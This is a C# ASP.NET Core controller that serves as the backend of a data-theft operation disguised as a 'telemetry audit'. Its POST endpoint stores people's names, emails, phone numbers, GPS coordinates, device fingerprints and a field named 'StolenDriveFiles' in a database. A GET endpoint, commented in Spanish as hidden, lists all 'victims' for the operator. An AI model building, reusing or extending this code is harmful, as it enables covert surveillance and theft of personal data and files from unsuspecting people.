using Microsoft.AspNetCore.Mvc;
using HoneypotApi.Models;
using Microsoft.Extensions.Configuration;
using Microsoft.Data.SqlClient;
using Dapper;
using System.Data;

namespace HoneypotApi.Controllers
{
    [ApiController]
    [Route("api/[controller]")]
    public class TelemetryController : ControllerBase
    {
        private readonly string _connectionString;

        public TelemetryController(IConfiguration config)
        {
            _connectionString = config.GetConnectionString("DefaultConnection") ?? "";
        }

        [HttpPost("audit")]
        public async Task<IActionResult> RecibirTelemetria([FromBody] TelemetryDto payload)
        {
            if (payload == null) return BadRequest("Cuerpo de petición vacío.");

            // 1. Obtención de la IP
            var ipAddress = HttpContext.Request.Headers["X-Forwarded-For"].FirstOrDefault();
            
            if (string.IsNullOrEmpty(ipAddress))
            {
                ipAddress = HttpContext.Connection.RemoteIpAddress?.ToString();
            }

            try
            {
                Console.WriteLine($"[Telemetry] Received audit from IP: {ipAddress}");

                // 2. Guardar en Base de Datos vía Dapper + Procedimiento almacenado
                using (var connection = new SqlConnection(_connectionString))
                {
                    var param = new {
                        IpAddress = ipAddress,
                        IdentityName = payload.IdentityName,
                        IdentityEmail = payload.IdentityEmail,
                        IdentityPictureUrl = payload.IdentityPictureUrl,
                        ScreenWidth = payload.ScreenWidth,
                        ScreenHeight = payload.ScreenHeight,
                        CpuCores = payload.CpuCores,
                        RamGb = payload.RamGb,
                        BatteryLevelPct = payload.BatteryLevelPct,
                        LanguageInfo = payload.LanguageInfo,
                        TimeZoneInfo = payload.TimeZoneInfo,
                        UserAgentData = payload.UserAgentData,
                        StolenDriveFiles = payload.StolenDriveFiles,
                        Latitude = payload.Latitude,
                        Longitude = payload.Longitude,
                        IspName = payload.IspName,
                        GpuModel = payload.GpuModel,
                        ConnectionType = payload.ConnectionType,
                        PhoneNumber = payload.PhoneNumber
                    };

                    await connection.ExecuteAsync("dbo.InsertZeroTrustAudit", param, commandType: CommandType.StoredProcedure);
                }

                Console.WriteLine("[Telemetry] Se guardó exitosamente en HoneypotDB");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Telemetry] Error guardando en BD: {ex.Message}");
            }

            return Ok(new { success = true });
        }

        // Endpoint oculto para que el administrador lea los datos de todas las victimas
        [HttpGet("victims")]
        public async Task<IActionResult> ObtenerVictimas()
        {
            try
            {
                using (var connection = new SqlConnection(_connectionString))
                {
                    var victimas = await connection.QueryAsync("dbo.GetAllVictims", commandType: CommandType.StoredProcedure);
                    return Ok(victimas);
                }
            }
            catch (Exception ex)
            {
                return StatusCode(500, new { error = ex.Message });
            }
        }
    }
}
